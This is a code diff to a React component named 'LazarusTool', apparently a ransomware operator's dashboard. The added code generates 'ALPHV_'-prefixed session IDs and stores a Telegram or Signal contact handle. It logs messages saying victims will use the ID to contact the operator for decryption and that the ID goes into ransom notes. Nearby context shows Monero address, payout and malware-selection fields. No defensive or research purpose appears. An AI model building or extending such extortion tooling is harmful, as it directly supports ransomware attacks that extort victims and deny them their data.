@@ -17,6 +17,8 @@ export default function LazarusTool() {
   const [walletAddress, setWalletAddress] = useState('');
   const [payoutAmount, setPayoutAmount] = useState('');
   const [moneroAddress, setMoneroAddress] = useState('');
+  const [sessionId, setSessionId] = useState('');
+  const [apkContact, setApkContact] = useState('');
   const messagesEndRef = useRef<HTMLDivElement>(null);
 
   const scrollToBottom = () => {
@@ -296,6 +298,68 @@ export default function LazarusTool() {
         </div>
       </div>
 
+      {/* Session ID & APK Contact */}
+      <div className="bg-black/40 border border-purple-900/20 rounded p-3">
+        <label className="text-purple-400 text-xs font-black uppercase block mb-2">
+          <i className="fas fa-id-badge mr-1"></i>Session ID & APK Contact
+        </label>
+        <div className="space-y-2">
+          <div>
+            <label className="text-purple-400 text-xs font-black uppercase block mb-1">Session ID</label>
+            <div className="flex gap-2">
+              <input
+                type="text"
+                value={sessionId}
+                onChange={e => setSessionId(e.target.value)}
+                placeholder="ALPHV_12345_67890..."
+                className="flex-1 bg-black border border-purple-900/30 rounded px-3 py-2 text-purple-400 font-mono text-sm outline-none focus:border-purple-500/50"
+              />
+              <button
+                onClick={() => {
+                  const newSessionId = `ALPHV_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                  setSessionId(newSessionId);
+                  addLog(`Generated session ID: ${newSessionId}`, 'success');
+                }}
+                className="px-3 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-black uppercase rounded transition-all"
+              >
+                <i className="fas fa-sync mr-1"></i>Generate
+              </button>
+            </div>
+          </div>
+          
+          <div>
+            <label className="text-purple-400 text-xs font-black uppercase block mb-1">APK Contact Method</label>
+            <input
+              type="text"
+              value={apkContact}
+              onChange={e => setApkContact(e.target.value)}
+              placeholder="Telegram: @alphv_support or Signal: +1234567890"
+              className="w-full bg-black border border-purple-900/30 rounded px-3 py-2 text-purple-400 font-mono text-sm outline-none focus:border-purple-500/50"
+            />
+          </div>
+          
+          <button
+            onClick={() => {
+              if (sessionId && apkContact) {
+                addLog(`Session ID configured: ${sessionId}`, 'success');
+                addLog(`Contact method set: ${apkContact}`, 'success');
+                addLog('Victim can now contact for decryption support', 'info');
+              } else {
+                addLog('Please fill session ID and contact method', 'error');
+              }
+            }}
+            className="w-full py-2 bg-orange-600 hover:bg-orange-500 text-white text-xs font-black uppercase rounded transition-all"
+          >
+            <i className="fas fa-save mr-1"></i>Save Contact Config
+          </button>
+          
+          <div className="text-xs text-yellow-400">
+            <i className="fas fa-exclamation-triangle mr-1"></i>
+            Session ID will be included in ransom notes for victim contact
+          </div>
+        </div>
+      </div>
+
       {/* Malware Selection */}
       <div className="bg-black/40 border border-purple-900/20 rounded p-3">
         <label className="text-purple-400 text-xs font-black uppercase block mb-2">
@@ -389,7 +453,26 @@ export default function LazarusTool() {
               </div>
             </div>
           </div>
+        
+        {/* Session ID & Contact Info */}
+        <div className="bg-black/60 border border-purple-900/10 rounded p-2">
+          <h4 className="text-cyan-400 font-bold text-xs mb-2">
+            <i className="fas fa-id-badge mr-1"></i>Session & Contact Information
+          </h4>
+          <div className="space-y-2">
+            <div className="text-xs text-gray-300">
+              <div>Session ID: {sessionId || 'Not generated'}</div>
+              <div>Contact: {apkContact || 'Not configured'}</div>
+              <div>Status: {sessionId && apkContact ? 'Active' : 'Incomplete'}</div>
+            </div>
+            
+            <div className="text-xs text-blue-400">
+              <i className="fas fa-info-circle mr-1"></i>
+              Victims will use this Session ID to contact for decryption
+            </div>
+          </div>
         </div>
+      </div>
       )}
 
       {/* Controls */}
